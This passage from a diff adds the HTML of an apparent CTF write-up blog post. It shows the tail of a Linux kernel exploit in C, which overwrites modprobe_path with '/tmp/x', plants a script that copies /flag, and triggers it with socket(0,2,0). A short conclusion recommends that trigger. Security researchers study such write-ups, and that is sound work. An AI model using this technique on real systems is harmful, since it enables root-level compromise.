+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1a41e05</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x197a9f8</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xa</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">strcpy</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>buf[<span style="color:#ae81ff">0x58</span>], <span style="color:#e6db74">&#34;/tmp/x&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        buf[<span style="color:#ae81ff">0x58</span><span style="color:#f92672">+</span><span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000003200000000</span>;
+</span></span><span style="display:flex;"><span>        buf[<span style="color:#ae81ff">0x58</span><span style="color:#f92672">+</span><span style="color:#ae81ff">33</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1d4afc8</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[<span style="color:#ae81ff">0x58</span><span style="color:#f92672">+</span><span style="color:#ae81ff">34</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1d4afc8</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[<span style="color:#ae81ff">0x58</span><span style="color:#f92672">+</span><span style="color:#ae81ff">35</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1</span>;
+</span></span><span style="display:flex;"><span>        buf[<span style="color:#ae81ff">0x58</span><span style="color:#f92672">+</span><span style="color:#ae81ff">36</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">edit</span>(fd, i<span style="color:#f92672">+</span><span style="color:#ae81ff">0x400</span>, buf, <span style="color:#ae81ff">0x400</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;error_edit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;echo -en </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">#!/bin/sh</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">cat /flag &gt; /tmp/flag;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">chmod 777 /tmp/flag</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> &gt; /tmp/x; chmod +x /tmp/x&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">socket</span>(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cat /tmp/flag&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h1 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h1>
+<p>As we couldn&rsquo;t use AI during the CTF and we are now kinda tired, we will just slop the conclusion.</p>
+<p><code>modprobe_path</code> still works if you have write + leak + vibes. Old binfmt trigger is dead, <code>AF_ALG</code> is mid, but sockets are still funny.</p>
+<p>Best trigger: <code>socket(0,2,0);</code></p>
+<p>No crypto nonsense, no SCTP, no netlink pain. Just CONFIG_MODULES=y + CONFIG_NET=y and boom, kernel calls modprobe 🧨🔥</p>
+<p>Exploit was ugly, offsets were cursed, freelist got bonked, flag got stolen. ✅</p>
+<p>kernel moment 🤡🫡</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://leo1.cc/">leo_something</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a><script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script>
+    const images = Array.from(document.querySelectorAll(".post-content img"));
+    images.forEach(img => {
+        mediumZoom(img, {
+            margin: 0,  
+            scrollOffset: 40,  
+            container: null,  
+            template: null,  
+            background: 'rgba(0, 0, 0, 0.8)'
+        });
+    });
+</script>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
